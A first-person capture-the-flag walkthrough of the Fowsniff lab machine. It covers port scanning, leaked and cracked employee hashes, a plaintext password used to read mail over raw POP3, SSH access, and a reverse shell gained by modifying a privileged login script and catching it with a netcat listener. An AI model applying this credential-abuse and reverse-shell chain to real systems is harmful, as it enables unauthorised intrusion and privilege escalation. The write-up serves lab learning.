I started by scanning the target machine using Nmap to find the open ports and running services.

nmap -sC -sV TARGET_IP

I found the following open ports:

22/tcp   SSH
80/tcp   HTTP
110/tcp  POP3
143/tcp  IMAP

Port 80 was running an Apache web server and the website title was Fowsniff Corp - Delivering Solutions.
Since HTTP was open, I started enumerating the website. I also checked the robots.txt file:

curl http://TARGET_IP/robots.txt

I then found information about the Fowsniff organization and discovered that employee credentials had been leaked publicly.
I found the following usernames and password hashes on github:

mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e

I then cracked the leaked hashes and obtained the passwords using Crackstation.
After that, I used the POP3 service running on port 110 to access the employee mailbox.
I initially tried using Metasploit's POP3 login module, but I had some issues with the username format. I then connected directly to the POP3 service:

nc TARGET_IP 110

I logged in using the valid credentials:

USER seina
PASS scoobydoo2

The login was successful.
I then checked the mailbox:

LIST

There were two messages, so I read them using:

RETR 1

and:

RETR 2

One of the emails contained useful information/credentials for accessing the system through SSH.
I then used the obtained credentials to SSH into the machine:

ssh <username>@<TARGET_IP>

This successfully gave me access to the Fowsniff machine.
After getting access to the machine, I enumerated the files and discovered cube.sh, which was being executed during SSH login with elevated privileges.
I inspected the script and found that I could use it to obtain a reverse shell.
I started a listener on my AttackBox:

nc -lvnp 4545

I then configured the callback in cube.sh to connect back to my AttackBox.
After starting a fresh SSH session, the script was executed and I received a connection on my listener.
I checked my privileges:

whoami

and:

id

This gave me root-level access.
I then went to the root directory and found the root flag.

cd /root
ls
cat flag.txt

BOOM!
I successfully obtained the root flag and completed the Fowsniff CTF.
